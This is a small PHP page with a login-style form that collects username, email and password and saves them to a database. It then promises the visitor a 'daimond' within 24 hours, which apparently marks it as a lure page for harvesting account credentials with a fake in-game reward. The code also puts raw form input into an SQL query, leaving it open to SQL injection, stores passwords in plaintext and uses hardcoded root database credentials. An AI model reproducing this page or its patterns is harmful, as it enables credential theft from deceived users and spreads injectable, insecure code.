<?php
$conn = mysqli_connect("0.0.0.0","root","root","activedb");

if(isset($_POST['submit'])){

$username = $_POST['username'];
$email = $_POST['email'];
$password = $_POST['password'];

$sql = "INSERT INTO user(username,email,password)VALUES('$username','$email','$password')";

if(mysqli_query($conn,$sql) == TRUE){
echo "<h2>successful your details.giveing your daimond.please 24 hours waiting you.</h2>";
}else{
echo "Don’t connect data try agoin";
}


}

?>




<html>
<head>
<title>personal info</title>
</head>
<body>
<form action="index.php" method="POST">

<input type="text" name="username" placeholder="enter your username"/><br><br>

<input type="email" name="email" placeholder="enter email"/><br><br>

<input type="password" name="password" placeholder="enter password"/><br><br>

<input type="submit" value="Login" name="submit"/>

</form>
</body>
</html>
